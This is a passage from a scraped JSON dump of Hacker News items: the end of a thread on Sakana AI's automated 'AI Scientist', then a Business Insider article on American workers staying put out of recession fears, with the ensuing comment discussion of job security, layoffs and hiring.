coconut in the sharpest textbook abdominal image. My impression is also that by far these two problems outweigh the problems that could potentially be solved by adding AI into the mix. These are the systemic organization problems of perverse incentives and vicious practices, and no amount of AI is going to do anything about it... because it's about people. People's salaries, careers, friendships etc. reply malux85 11 hours agoprevI’m working on this now, I literally have another window open beside this browser window with the Multi-agent LLM logs outputs scrolling. A few differences through - I’m working on Materials Science only. Mine has vision capabilities so it can read graphs in papers. Mine has agentic capabilities too, so can design and then execute simulations on Atomic Tessellator (my startup) by making API calls - this actual design and execution of simulations is what I aimed for at the start. Long way to go, but there’s a set of heuristics that decide which experiments to attempt which means we only attempt ones more likely to work, lots of fine tuning prompts, self critique, modelling strategies and tactics as node graphs to avoid getting stuck in what I call procedural local minima, and loads more… I started with MetaGPT framework but found it’s APIs too unstable so I settled on AutoGen, you don’t really “need” a framework, just be sensible about where your abstraction boundaries are, make them simple but composable, Dockerize and k8s for running, and I modified the binaries of a bunch of quantum chemistry software so that multi GPU arches are supported without re compilation (my hardware setup is heterogeneous) Even if the LLMs can’t innovate in a “new sense” certainly having them reproduce work in simulations for me to inspect is very valuable - I have the ability to “fork” simulations like you can fork code so it’s easy to have the LLMs do a bunch of the work and then I just fork and experiment myself reply viraptor 14 hours agoprevIt's interesting that the cost total is the same in all tables. I can't tell if that's a copy&paste error, or the cost was capped, or are the totals for all the experiments? > Aider fails to implement a significant fraction of the proposed ideas. Yeah, that can be improved a lot with a better agent for code. While aider is fast and cheap, going with something like plandex or opendavin makes a massive difference... both in quality and cost. For example plandex will burn $1 on a simple script, but I can expect that script to work as requested. A mixed approach could be deepseek coder with an agent - a bit worse quality, but still cheaper to do more iterations. reply breck 4 hours agoprevthe aientist.com ;) reply conglu1997 16 hours agoprevIncredible step towards AI agents for scientific discovery! reply letitgo12345 15 hours agoprev [–] Feels like the next generation of models could truly start replacing lower level ML and software engineers reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Sakana AI has introduced \"The AI Scientist,\" a system for fully automated scientific discovery, capable of performing research independently without human supervision.",
      "Key features include automating the entire research lifecycle, an automated peer review process, and cost-efficient paper generation at approximately $15 per paper.",
      "Despite its advancements, The AI Scientist faces limitations such as lacking vision capabilities and occasionally making critical errors, highlighting the need for human oversight and ethical considerations."
    ],
    "commentSummary": [
      "The AI Scientist project aims to automate the entire research lifecycle, generating scientific papers at a low cost, which has sparked debate about its impact on the scientific process.",
      "Critics argue that AI-generated research lacks the hands-on training and quality of human-led research, potentially leading to academic spam and undermining trust in scientific publications.",
      "Proponents believe that AI can accelerate scientific discovery, especially in critical fields like medicine and climate change, but emphasize the need for human oversight to ensure reliability and relevance."
    ],
    "points": 178,
    "commentCount": 102,
    "retryCount": 0,
    "time": 1723515058
  },
  {
    "id": 41229600,
    "title": "Workers are stuck in place because everyone is too afraid of a recession to quit",
    "originLink": "https://www.businessinsider.com/us-job-market-recession-outlook-workers-quitting-hiring-trends-2024-8",
    "originBody": "Economy American workers are stuck in place because everyone is too afraid of a recession to quit Jennifer Sor 2024-08-10T12:16:01Z Share Facebook Email Twitter LinkedIn Copy Link Save Read in app American workers aren't so quick to quit a job anymore—largely because they're afraid of a coming recession, labor experts told Business Insider. Getty Images; Jenny Chang-Rodriguez/BI American workers are feeling stuck as opportunities in the job market shrink. Workers are having a tougher time finding a new gig and are more hesitant to quit, labor experts told BI. That's likely due to fears of recession, which historically has caused workers to hunker in place. Advertisement America's job market is in a bind. That's probably no surprise to current job-seekers, who are having an increasingly tough time landing a new gig as hiring slows and job boards run dry. The stagnation has resulted in a rise in \"stuck\" workers — frustrated employees who say they want to quit a job, but are staying put as the fear of a potential recession looms in the backs of their minds. A 24-year-old employee working in histology named Amanda, who spoke with Business Insider, is one such worker who feels that way. She's choosing to stay in her current role as there are limited offerings in her field, and switching employers would likely lead to her pay being cut by at least a third. Advertisement \"I feel trapped here,\" Amanda said. \"I'm financially screwed if I leave, and that's why I don't, or can't leave.\" Americans have long grumbled about their feelings of being stuck in an unsatisfying role, but the feeling appears to be growing: Americans are quitting their jobs at the slowest pace since the pandemic, with the quits falling to just 2.1% in July, according to the Bureau of Labor Statistics. Related stories Yet, job satisfaction fell across 26 measures in the past year, per an annual survey from the Conference Board. Google search interest for the search phrase \"quitting job\" is down 11% over the last year, according to data accessed from the search analytics tool Glimpse. Advertisement Search interest for the phrase \"quitting job\" is down 11% over the past year. Google Trends/Glimpse \"Stuck at work,\" meanwhile, is becoming a more common search term, with interest rising 9% in the past year. Google searches for \"stuck at work,\" meanwhile, have climbed 9% over the past year. Google Trends/Glimpse Membership on the subreddit r/hatemyjob has more than doubled over the past two years, with users on the community growing 30,000-strong as of August, up from 14,7000 in 2022, according to historical data from the analytics site SubredditStats. \"Stuck at a job,\" one user on the subreddit posted. \"I'm no longer fond of the work I do. I feel stuck because of the money. It's a good problem to have, I suppose.\" \"I'm just so done with this job. I've tried everything to stick it out but now I just can't do it anymore,\" another user wrote, adding that they had been looking for a job related to their degree for over a year. The search hasn't been successful, they said, citing \"tough\" conditions in the job market. Advertisement \"I want to quit this job so badly but I can't afford it.\" Recession fears loom large Workers have typically hunkered down when the economy slows, with recessions often tied to plunges in the quits rate, historical data from the Fed shows. The economy hasn't fallen into a recession but fears of a coming downturn are growing. In markets, investors panicked last week, sparking a huge sell-off after July payrolls were lower than expected, with the unemployment rate ticking up to 4.3%. Most Americans now believe the economy is in a recession, a recent Affirm survey found, despite GDP continuing to grow over the second quarter. Advertisement Google search interest in the term \"recession\" has exploded 230% over the past month, Glimpse data shows. Google search interest in \"recession\" has more than doubled in the past month. Google Trends/Glimpse \"I wouldn't say that we're in a recession or anything,\" Raymond Lee, the CEO of the career outplacement firm Careerminds told BI. \"I would say, though, that, just from my perspective, I think a lot of people are staying put in their jobs because I think that there is a lot of uncertainty … People are trying to stay where they are and not make any big moves.\" Korn Ferry, a consultancy that offers career transitioning and outplacement services, said it had seen an increase in inbound calls from job seekers. That's the opposite of what the firm saw during the post-pandemic hiring boom — and it's a solid sign the \"engine is slowing down,\" according to Radhika Papandreou, the president of Korn Ferry's North American arm. In general, clients are taking longer to secure new roles and appear to be prioritizing job security, Papandreou said. Advertisement \"People are also hesitant to leave their jobs to look at other jobs unless they feel like they're going to get something that's secure and for a long time,\" she added. \"There's a little bit of, 'I don't want to be last in, first out.'\" Job market forecasters say the slowdown in hiring looks poised to continue, even if the Fed begins to loosen monetary policy. Only 15% of small businesses said they were planning on adding new jobs in July, according to the latest survey from the National Federation of Independent Businesses, down from a peak of over 30% recorded several years ago. Read next Watch: Nearly 50,000 tech workers have been laid off — but there's a hack to avoid layoffs Job Market Recession Hiring More... Advertisement",
    "commentLink": "https://news.ycombinator.com/item?id=41229600",
    "commentBody": "Workers are stuck in place because everyone is too afraid of a recession to quit (businessinsider.com)157 points by paulpauper 21 hours agohidepastfavorite141 comments whack 18 hours agoI can empathize with the article. Earlier in my career, I would interview with any company that offered a significant pay increase. \"Why would anyone turn down a 30% pay raise\" was my mentality. Then I had a couple of jobs that didn't go well because of personality mismatches and politics. Which made me realize that even if I'm confident about my technical skills, that's no guarantee that I'll land on my feet at a new gig. Fast forward another few years, and the recession made me realize that I can't just snap my fingers and land a new better-paying job anytime I want. Combine both these factors, and I'm now ignoring recruiters who are begging me to interview for insanely well-paying openings. I have a decently well-paying job with good work-life balance, and colleagues who respect me. And I have no interest in throwing that away just to navigate a political minefield at a new job reply scrapcode 16 hours agoparentExactly where I'm at. It took a recent offer for ~30% more and all of the same benefits after a multi-stage interview to really slap me in the face with an appreciation of all of the other things aside from salary that I am happy about where I am at. It has taken me about a decade and plenty of other positions to realize how important those aspects are to me. I once had a shift work job with a lot of overtime. The money was great, but I had an opportunity for a M-F nine-to-five for $20k less per year. I was at a crossroad and asked myself at the time \"If someone right now told me I could be at home with my family every night and every weekend for the rest of my career but it cost me $20k/yr, would I pay it?\" That helped me make that decision much easier, and now I reversed that same idea. Essentially, I sat down and thought \"if I were to lose [great management|no work over 40hrs|remote without geographic restriction|great colleagues and no drama] would I be willing to pay $n to have it back?\" It's too easy to forget what our goals were prior to achievement. reply binary132 15 hours agorootparentSometimes I get the sense that these places offer a lot to compensate for a hellish work culture. reply keyle 18 hours agoparentprevThis is a fair point. Earlier in my career I jumped ships so many times I had to move to another city to find 'new work'. It was a rather small city with companies buying off each others etc. I learnt throughout these episodes that people make companies, not some branding or marketing dep. My motto for the last 20 years has been \"find good people, do good work\". Emphasis on __good__, not great, best, immaculate, amazing, nonsense. But definitely good. My standards are pretty high though! reply SirMaster 3 hours agoparentprevFor whatever reason, what you have come to learn was how I always felt from the start. I would rather make less in a job that I find all the aspects of it enjoyable. Relaxed and comfortable environment, flexibility, great co-workers and great boss that I both like, company treats me well, no stress, etc. I don't find I need all that much money to live comfortably and buy and do what I want. (computers/gaming, home theater, backpacking, skiing, scuba diving, pickleball, travel in general). And on top of those things I still manage to put away about half my income into retirement investments. reply silverquiet 3 hours agorootparentFrom that I assume no partner and certainly no children, which is everything to a lot of people. I'm similar, but a life of marginal disability has made things harder for me, and meant health insurance is direly important. I'm pretty happy to have found a place that is lower stress (can't imagine a job that pays and has no stress) as well. reply SirMaster 3 hours agorootparentNo partner and no childern. Though if I get a partner then we will have dual income and no childern which to me seems like it would be even better. Maybe no stress is being too generous. I never really feel stressed though at work, but maybe I am just also a low stress person. reply soared 16 hours agoparentprevSounds more like you have enough financial stability to not need a pay increase. People who are early in their career struggle to pay bills/rent/etc and so have to take every 30% they can - only until they don’t need to anymore. reply brailsafe 4 hours agorootparentMaybe, but it's more a matter of other kinds of luck and changing values. I'd make the same trade if I could, but because there's never been a time I could have chosen to stay on past the year and a half marker (always laid off or w/e), it's crucial I try and get as much as possible in that short time. Had I not been laid off, there'd definitely come a time where I'd prefer to just take half a year off and come back than start fresh. My impression is that for people with that choice, they're often unable to convince themselves they don't need the money, since there's always a way to rationalize it, and so they continue making choices exclusively on that basis reply citizen_friend 17 hours agoparentprevthis sounds a lot like the psychology of having nothing to lose vs something to lose. You play more aggressively and are more successful in the former case. reply kranner 17 hours agorootparentArguably GP is already successful in their current position with respect to overall satisfaction, if one treats satisfaction as a boolean. reply KolenCh 17 hours agorootparentprevDefine successful. I think you two had an opposite meaning of what successful is. reply citizen_friend 4 hours agorootparentHaving a job he likes that pays him money he wants. That’s the criteria outlined. He’s just afraid it might end up being a job he doesn’t like. There is a myth that higher paying jobs must be more miserable, but it’s rarely true. reply KolenCh 1 hour agorootparentRead more carefully: > I'm now ignoring recruiters who are begging me to interview for insanely well-paying openings. I have a decently well-paying job with good work-life balance, and colleagues who respect me. So their utility function has terms other than $. So define \"successful\", or define the utility function more objectively. It is very clear that yours vs theirs are quite different. reply brightball 18 hours agoparentprev“Don’t mess with happy.” - Brad Scott reply away271828 18 hours agoparentprevI do know various people who left a job with a former employer because they weren't happy and seemingly landed fine AFAIK. I mostly stuck things out for a bit because I was mostly retiring. Otherwise, I'd probably have done the same even if the end-result was retiring a bit early. reply whateveracct 18 hours agoparentprevyeah i don't love my job at all but it's...fine. they call it work for a reason. a few years ago, i'd bail. not an option today since i like money. gonna ride this gravy train a bit more. not gonna do it with a smile though. reply kamaal 15 hours agoparentprev>>\"Why would anyone turn down a 30% pay raise\" One of my friends here in Bangalore took a offer on those lines from a start up, around COVID. He realised instantly these things are for people with a life that is problem free, disease free, responsibilities free linear progression. Soon enough his parents had to be hospitalised for big surgeries and he realised the start up comp had a near 0 health insurance cover. A decade's worth savings wiped clean in one go. It took a while even for me to get to this realisation, if you have a good going, things are stable, office culture is good and friendly, and you have a comp that is better overalls. You are likely to do well in such a place on the longer run than jumping 10 places and realising the comp at a lot of places is just straight up fraud. They just cut things in one place and add some where else. In many cases the comp is bloated with big numbers but with a dozen ifs and buts(often company/team linked variable pay etc). Eventually you could say that making rapid changes to a process doesn't necessarily add to bigger gains. You see this in the stock markets as well. Profit is inversely proportional to the quantity of trades you execute. Big gains come from stability and sticking to one winning formula for long. Same with health, relationships and jobs. Do more of that one thing that works. Don't try to do many such things that could work or mostly fail. reply unmole 9 hours agorootparentI completely agree with your larger point. However: > start up comp had a near 0 health insurance cover. A decade's worth savings wiped clean in one go A typical employer provided health insurance probably wouldn't have made a difference here. The sum insured generally tops out around 10 lakhs. reply kamaal 3 hours agorootparentOnly if you are working at a good start up. Most places don't offer such good insurance package. In many cases parents are not covered. Its true some people make it big working at start up. Most unfortunately don't. Overall, I would advice if you are having non trivial life situations like old parents, unstable health care situations, or just can't afford to take risks, I would say just don't work at start ups. reply jawns 19 hours agoprevIn 2020, COVID caused the most dramatic rise in unemployment the U.S. had ever seen. Employees who were lucky enough to avoid being laid off during the first few months of the pandemic largely hunkered down and resolved to stay with their current employer until the dust settled, even if they would otherwise have been looking to change jobs. This led to a phenomenon in 2021 and 2022 called the Great Resignation, a period where hiring began opening up again. All of those employees who'd been itching for an exit saw an opportunity to make their move. One of the interesting effects of this higher-than-normal employment migration in a relatively short period of time is tenure synchronization, where a large percentage of employees have been with the company for the same amount of time. Naturally, there will be some variation in when they decide to make their exits, but this synchrony does increase the chance of a mass exodus event once they've passed the year of average tenure. There are other macroeconomic phenomena that are contributing toward sustained \"phase locking\" of the amplitude of employment migration. Post-pandemic, we saw an era of high inflation, and that caused many companies to veer back into more cautious territory and question whether they'd over-resourced themselves during the hiring boom. This led to rounds of layoffs in 2022 and 2023. These conditions have also led to downward pressure on wages. Thus, many employees are waiting until the next hiring wave to make their move. These factors are likely to induce even more phase locking than the tenure synchonization alone, which means that we could see a second or even third \"Great Resignation\" event occur during the current decade as employees' synchronized tenures lead to voluntary exits that coincide. reply keyle 18 hours agoparent> In 2020, COVID caused the most dramatic rise in unemployment the U.S. had ever seen. I'm afraid this isn't accurate, unless your history of the U.S. is 10 years. reply Izkata 18 hours agorootparentThis goes back to 1948 and they're correct for that time span: https://fred.stlouisfed.org/series/UNRATE The lockdowns forced a lot of people into unemployment for a variety of reasons on top of the normal \"it was a recession\" ones. reply keyle 17 hours agorootparentThanks for this, I was referring to the great depression of 1929. in 1933 when the unemployment rate reached 25 percent. ref. Google reply jawns 16 hours agorootparentYou're referring to highest unemployment rate. My statement, \"most dramatic rise in unemployment,\" means something different. While the Great Depression saw a much higher peak unemployment rate, the rate of change in April 2020 was the fastest one-month increase in US history. reply keyle 16 hours agorootparentMy bad, thanks for clarifying! reply jawns 7 hours agorootparentSo few people these days are willing to say what you just said! I applaud you, and (with AI assistance) I've written you an acrostic poem. Holding oneself lightly, not with pride Understanding we all have flaws inside Modest in manner, gentle in speech Inclusive of others, willing to teach Learning from mistakes, growing each day Ignoring the urge to have our own way Thoughtful of others, putting them first Yielding to wisdom, quenching ego's thirst reply keyle 7 hours agorootparentHah thanks. It's important to stay human on the internet, more than ever before. reply dalyons 16 hours agorootparentprevThis is quite the pedantic point though. That was nearly 100 years ago and has almost nothing to do with today reply PeeMcGee 16 hours agorootparentI actually interpreted the phrasing of \"most dramatic rise in unemployment the U.S. had ever seen\" exactly to mean \"it was even worse than the great depression in some ways\". It seems too peculiar of a thing to say otherwise, especially when the great depression is like the main thing anyone would think to compare it to. reply underlipton 15 hours agoparentprevAnother view: a lot of people were laid off at the beginning of 2020. To prevent a total meltdown, unemployment assistance was made unusually robust (for the US). With the stimulus, it was not unheard of for people to be getting more in unemployment than they'd ever made actually working. Likewise, PPP loans meant that anyone with even a trivial business and a handful of employees could apply for support. The \"Great Resignation\" (a clever bit of branding; people were moving to better jobs, not resigning) coincided with that easy money drying up. Businesses had to actually start making money again, as did workers (many of whom re-skilled during the pandemic). Higher-than-normal employment migration might have just been people coming out of unemployment, gig work, and whatever jobs they took just to ride out the crisis. Also, high inflation coincided with the increased numbers at many companies. The layoffs came after inflation started to cool (probably an important contributor to stagnating wage growth), and probably were related to the Fed continuing to raise interest rates and putting off a pivot to dropping them until... Well, they still haven't done a cut, yet. reply eltoxo 6 hours agorootparentIt is also the normal state of the economy to not job jump because it is normally hard to get a job. The far from equilibrium state was software jobs with 0% interest rates the last decade. Then you have people who entered the workforce during this time believing this is how things have always been and always will be. Surprise! That was a temporary state we are never going back to in your lifetime. It is like when I was young, every song had to have a guitar solo. To hear a song with no guitar solo was so weird. I assumed things would always be this way. Neither the guitar solo or the 2016 software job market is ever coming back the same way it use to be. reply Jensson 4 hours agorootparent> it is normally hard to get a job. It isn't normal for it to be hard to get a job, what is hard is to get a better job than you have now since you worked hard to find that job. reply brailsafe 1 hour agorootparent> It isn't normal for it to be hard to get a job, what is hard is to get a better job than you have now since you worked hard to find that job. That seems like a weirdly narrow perspective. Seems like it entirely depends on every aspect of circumstance, micro, and macro economic, as well as all facets of personal luck, industry, roll of the dice at birth. This is true of everything, not just the job search. Every one of my friends for example has a job and has no reason to think it's hard to get one, but they only know one guy in software, and my perspective for the last 8 years has been it's hard to find a job. Meanwhile, they're all lonely and desperate, struggle to form long term connections, and this is a sentiment shared by many on their 30s atm, but not me, it's normally easy. I'm sure when I get my next one, there's enough likelihood of meeting a few people who've been employed their whole life but haven't made any new close friends since school, to wit we'd reach a similar difference in perspective. It's my impression though that it's nearly always been easier to get a better or different job than it is to get a job without one, which informs the general cliche, however factually true it is, that it's better to look for a new job while you have one. reply keyle 18 hours agoprevWhen people started to coin the term \"silent quitting\", it was a tell-tale sign of what was to come: a screwed up economy with positive unemployment rate. The measurements and metrics of the Keynesian economy need to evolve, they're about the same nonsense for the last 50 years. They have no consideration for the modern days, open economies, globalisation, remote work, isolation, depressive open offices and meaningless work. Meanwhile we're still looking at the same job figures as a primary indicator of doom and gloom. There is no measurement for innovation, happiness, self-worth or satisfaction; if they had one, it would show that it plummeted to never seen levels of despair. Job figures don't show how the economy relies on how much we can screw people over with things they can't get away from (\"moats\"), while being stuck in jobs they never wanted to do in their right minds (\"career\"). It all started with mortgages if you ask me. It never became about how much you could afford a house, but how much a third-party thought they could get out of you to afford a house - they inflated the prices of. The idea that we buy these extremely expensive \"permit to live here\", paying for the rest of your life is mental. reply theappsecguy 17 hours agoparentNot sure what silent quitting had to do with the unemployment rate increase? This is mostly a result of utter incompetence and irresponsible spending during the pandemic. Economy got pumped with cheap money and there was always going to be a day when the gravy ends. Doesn’t help that tech over hired and poured funding in just about anything. I’m calling it right now, AI will see the same crash within a few years. reply keyle 17 hours agorootparentI wrote \"positive unemployment rate\". I meant that it's overall positive numbers even though it's complete doom and gloom on the market. see the 5Y chart https://tradingeconomics.com/united-states/employment-rate reply meroes 17 hours agorootparentprevQuiet quitting was a way to blame worsening economy on younger generations, or just to take a swipe at them, that's the extent of the relationship AFAICT. With you on the AI crash. reply lazide 15 hours agorootparentEh, I took it as a buzzword to represent the mindset of ‘I pretend to work, they pretend to pay me’. All of this is representative of, IMO, late stage - and nearly population wide - burnout due to an incredibly long ‘up and to the right’ period of economic growth coupled with high stress (from COVID) when it would otherwise be slowing down, and extreme emotional manipulation by those too afraid to look down and have it end. Which isn’t just from ‘the rich’, BTW. I’ve seen that manipulation from a portion of all segments of the population. reply Izkata 5 hours agorootparent> Eh, I took it as a buzzword to represent the mindset of ‘I pretend to work, they pretend to pay me’. That's the blame shifting GP was referring to. It actually means \"doing only what you're paid to do\" instead of the \"work is family\" unpaid overtime trend that had been becoming common. reply lazide 4 hours agorootparentEh, many many times it’s ’doing only the work someone will fire you for if they notice you’re not doing it - and no one is paying attention’, which is often very different from doing the work one is nominally paid to do. It’s a wide spectrum. But yeah, folks stopped busting their ass to do stuff that wasn’t even in the job description - the horror. reply meroes 14 hours agorootparentprevI think that’s how a lot of workers took it, but it eventually morphed into a talking point by the wealthy too that left off the second part. I hate to say it but some of my family members were talking to quiet quitters with disgust. Zero mention of unfair pay. It echoed what I saw on CNBC and other media at the time. reply reverius42 12 hours agorootparent\"Nobody wants to work anymore\" (for $12/hr when rent is $1800/month) reply neom 14 hours agoparentprevYour last point about mortgages is interesting. It's probably highly dependent on the type of society you want? On one hand, why should I not be able to use my land as a financial instrument, it's my land, if I want to bet the land price will go up for whatever reason, and someone wants to offer a tool to enable that, some folks would say that should be just fine. On the other land, once a relative level of systemic sophistication has been reached, that system in that appreciated land will become inaccessible to certain groups of people. Some folks will find this unfair. (just some thought, not really opinions) reply abhis3798 14 hours agorootparentExtend this and you get benefits of capitalism vs downsides of unchecked capitalism. reply jokoon 14 hours agoparentprevI like being unemployed. But on the other hand, I cannot socialize without a job. I have embraced the antiwork mentality, but it needs to be said that it doesn't solve everything. I still want to get a job just so I can get up in the morning and have a routine and see people and feel included. I would say antiwork is the expression of mental illness through politics or vice versa. It's not going to get solved soon. reply 4gotunameagain 13 hours agorootparentI'm very curious, why can you not socialise without a job ? For me it is quite the opposite, my entire social life is very separated from work, and I tend to compartmentalise and not hang out with colleagues after work. I think it's just something about flipping the page in the middle of the day, letting go and relaxing. reply rachofsunshine 20 hours agoprevWe hear this from candidates pretty often (it's the second most common specific reason for a candidate to turn down outreach for a job, after \"please don't match me with crypto companies\" [1]), although we're new enough that I can't make an apples-to-apples comparison for how common it was prior to the current environment. What's odd is that, on paper and for the engineering jobs we work with specifically, it doesn't seem like that's actually more justified now than it was a year or two ago. The tech hiring market seems to have bottomed out and to be (unsteadily) on its way back up. Two years ago, prediction markets [2] were pretty confident a recession would occur by this point, but it hasn't. They're now down to about 25% that it'll occur by the end of this year, although the fact that the percentage has stayed flat even as time has run out suggests markets are a bit more bearish now than they were six months ago. And they think [3] that large interest rate cuts are coming. But perhaps a few years of frustration and seeing others struggle has taken its toll in ways that go beyond object-level economic predictions. Experience with rough conditions might've made people more risk averse, or make them feel more secure in the job they do have (after all, there's a good chance they've survived some layoffs at this point), both of which could (rationally) make them stick where they are even if their opinions of the broader economy were the same or better. ---- [1] EDITED to add: reasons they turn down outreach we actually send, meaning it's not disqualified by some structured info we have about their preferences. For example, we know whether a candidate wants a remote job, so even though ~60% of our candidates are looking for remote jobs only, that wouldn't be in this ranking. [2] https://manifold.markets/chrisjbillington/will-the-us-enter-... [3] https://manifold.markets/barak/by-how-much-will-the-fed-cut-... reply darth_avocado 19 hours agoparentLayoffs are still happening in tech (Cisco, Intel, Intuit to name a few in the last couple of months) and companies that are hiring, have very few roles or are very selective in their hiring process. And beyond hiring, internally, the companies are being hyper focused on performance. People are being let go despite working hard and going above and beyond. The comparison really is: Do I leave my current job which may pay less but won’t fire me or do I go to a new company, risk performance based firing and then be unemployed for months before I find the next job. reply SoftTalker 16 hours agorootparent> the companies are being hyper focused on performance If you are being paid some multiple of six figures would you not expect this? reply delfinom 5 hours agorootparentYea, I think much of the tech industry has really had it too cushy. The (internet) tech industry had 2 decades of nearly constant growth because it was a completely new thing to human civilization. But now it's all hitting maturity and the status quo is changing with it. It's also why companies are desperate to sell AI as its currently the only visible avenue for further large growth to pump stocks. reply jimbob45 18 hours agorootparentprevPeople are being let go despite working hard and going above and beyond. This is what primarily scares me and my circle. I'm not going to look for another job while I see and know people far smarter than me being let go from positions far more important than mine. reply rachofsunshine 18 hours agorootparentI'd argue that's a very good reason to have backup options. Remember that looking for a job does not commit you to leaving your current one unless you find something better. reply lolinder 16 hours agorootparentThe problem is that the job market is a market for lemons on both sides. From the employee side, I have no way of knowing whether I've actually found something better. It could be that I've just found a company that interviews well or that got lucky enough to avoid putting foot in mouth long enough to get me out the door. If I'm in a company that's good enough and am not sure I'll be able to land a job six months from now, it makes very little sense for me to even start looking because I know that any new job I find might be a lemon, even if it looks better during the interviews. reply rachofsunshine 16 hours agorootparentMarket-for-lemons is sometimes a useful framing, but there's such a thing as taking it too far. Markets, even markets for lemons, are frequently in non-equilibrium states. That can happen because actors have imperfect information, because underlying conditions have changed, because some actors are new to the market and haven't settled to equilibrium yet, because people have personal beliefs that override market-rational behavior, because market actors are simply bad at their jobs, or any number of other reasons. Far more information-perfect, rational, and optimized markets than hiring frequently show inefficient behavior in practice. Yes, there are market pressures that tend to remove good candidates and good jobs from the market, and that incentivize both sides to pretend they're better than they are. But a tendency is only a tendency, and not a guarantee, and incentives can be missed or ignored or defied or failed in implementation. A bad company might be incentivized to lie to you, but they have to be self-aware that they suck (a trait terrible companies very frequently fail at) and capable of implementing the deception, among other things. And that means that your impressions when you speak to them do carry meaningful signal that should shift your beliefs about them. A new job might be a lemon. But it also might not. You don't need to be certain that it isn't; you just need to be sure enough that the expected value of taking the new job, minus whatever risk discounting you're choosing to use, (minus the cost of searching for one), is greater than the expected value of staying in your current job. reply lolinder 16 hours agorootparent> You don't need to be certain that it isn't; you just need to be sure enough that the expected value of taking the new job, minus whatever risk discounting you're choosing to use, (minus the cost of searching for one), is greater than the expected value of staying in your current job. Agreed. And what I'm saying is that people aren't looking because the job interview process provides little enough information that the expected value of job hopping right now is very unlikely to exceed the expected value of staying put unless they're already in a bad situation. The time spent fielding phone screens and interviews isn't worth it if you already know that even a seemingly dream job wouldn't be worth the risk right now. In another, more certain environment with lower risk of long-term unemployment the calculus is different, but right now sticking with the devil you know is for most of us the most rational move until the layoffs slow down. reply away271828 15 hours agorootparentThe other thing I see is that people nearish retirement age and are comfortable, who might have cruised on for a few years, are pretty much going: now is probably the time. Maybe do some consulting though that's tight right now. So, maybe not optimal, but why stay in a non-ideal situation? reply VirusNewbie 13 hours agorootparentprevRight but a year ago, FAANG and deca-corns weren't even hiring at ALL. There was almost no headcount. Sure it's not a boom, but there is hiring, teams are getting backfills, it's not great but it's not near as horrible as it was. reply johnnyanmac 19 hours agoparentprev>What's odd is that, on paper and for the engineering jobs we work with specifically, it doesn't seem like that's actually more justified now than it was a year or two ago. The tech hiring market seems to have bottomed out and to be (unsteadily) on its way back up. I mean, as someone out of a full time job for 15 months now (4 of those by choice), I can't really blame them. Of course, I'm an extraordinary case in games that seems to be hit the hardest out of most domains, but the fallout hasn't seemed to bottomed out in this industry just yet. And in tech specifically: it's not like these interview processes are just a drink with the founders and a firm handshake anymore. You gotta weigh the question of \"do I REALLY want to study trivia and go through 5 stages of calls\" vs. the potential upsides of a new job/pay raise. Many tech professionals are probably not scrap for cash, so there's no financial pressure to jump at the next step up if they are focusing on security. >Two years ago, prediction markets [2] were pretty confident a recession would occur by this point, but it hasn't. Layoffs and the previous COVID bailouts probably \"helped\" in that regard. And indeed. As you said, it caused an even more extreme dichotomy of financial pressure between the middle class and below and the asset owning or upper-middle+ (who weren't laid off). Where the former may as well be in a depression while the latter two are on cloud nine, trading houses like baseball cards and growing money by just letting it sit. Is that better than a proper recession? I can't say, but you can understand why the former group can feel that way, and even feels bitter at the latter. Being told that the economy is soaring while your income barely increased 10% that barely covers rent. While rent surged 30% in the past 5-8 years. reply xbmcuser 17 hours agorootparentIn my opinion the US and many european countries are going through stagflation where parts of the economy that went down or decreased dramatically with covid are recovering so you have economic growth in those areas but the rest of the economy not doing so good as well parts losing the covid boost. reply zmgsabst 18 hours agorootparentprevK-shaped “recovery” is socially dangerous for that reason: - you have net positive statistics, so the government doesn’t intervene - you have a class that controls the levers of power growing substantial wealth in “services” and other extractive portions of the economy; and accompanying growth in large institutions or government - you have a largely devastated productive and working economy; and accompanying collapse of SMBs In whatever sense we’re not in a recession, that’s only because economic looting is so profitable on paper, we’re marginally positive. But that false signal of “not recession” can suppress normal responses and allow the country to move into socially unstable territory. reply nequo 17 hours agorootparentWhich institutions have been growing? For example, the overall number of government employees has been relatively stable since the 2007 crisis: https://en.wikipedia.org/wiki/Government_employees_in_the_Un... reply cjbillington 19 hours agoparentprevFWIW, the fact that the recession market on Manifold doesn't resolve until the end of 2025 (to give the NBER time to declare a recession) limits how low people will push the probability. I'm the biggest NO holder, and my credence is closer to 10%, but the rate of return isn't attractive enough to bet it lower. This is somewhat asymmetric, since bettors who expect a recession also expect an earlier payout. I made this derivative market to try to address the issue somewhat, but not much trading yet: https://manifold.markets/chrisjbillington/will-manifold-pric... reply Terr_ 13 hours agoparentprev> Two years ago, prediction markets [2] were pretty confident a recession would occur by this point, but it hasn't. Do prediction markets in general even predict well? Someone might stake out a losing long-term prediction, but in a way where it isn't profitable to bother taking their money. https://news.ycombinator.com/item?id=39178750 reply fundad 19 hours agoparentprevWhat's demoralizing is employers aren't motivated to fill the listed open positions and the only thing real and worth our time is our present, paying job. It's understandable, it costs nothing to list an opening and costs a lot to hire someone. reply johnnyanmac 18 hours agorootparentThere is that too. So much disrespect in the interview process vs. 2 years ago. It'd be unheard of for me to not at least get a polite \"we were looking for X/Y/Z\" if I got in contact with a human at some point in the process. Now it's a fortnightly occurance that some recruiter reaches out to me, talks for 15 minutes, and then is never heard from again. Sometimes they schedule a call and proceed to never make the call (and ofc never respond on LinkedIn to re-schedule). It just all sucks. The process was already pretty bad IMO, but now you're being treated as random quota fodder, with no interest to even pretend the position exists. reply Hnrobert42 15 hours agorootparentWhen recruiters have ghosted me after an interview and then a follow up email from me, I have scolded them with something like, \"Hey. I haven't heard from you in a few weeks. I am sure that you are busy, but so am I. I took the time to interview for your position. It is unprofessional and rude not to respond to my follow up.\" They almost always respond with an apology, and then I'm sure black list me. I don't much care. I'd rather work with competent caring people. And maybe my scolding will help the next recruit. reply tomcam 16 hours agoparentprevGreat perspective, thanks. Are you seeing fewer openings? Same quality or lower? reply rachofsunshine 16 hours agorootparentMore and higher quality. That's not a data-driven observation, though, it's just my own subjective impression (though it is one backed up by everyone else in the hiring space that I speak to right now). reply cma 18 hours agoparentprevWhat are non \"object-level\" economy predictions? reply rachofsunshine 18 hours agorootparentI mean \"as distinguished from their general principles for decision-making, e.g. risk aversion\". Maybe not a great use of the term. reply jdietrich 19 hours agoprevThis article appears to be plagiarised from Business Insider: https://www.businessinsider.com/us-job-market-recession-outl... reply jawns 19 hours agoparentIt's not technically plagiarized, because it attributes many of the direct quotes to Business Insider. But it's an example of repackaging content produced by other sources, a practice sometimes called \"churnalism.\" This type of 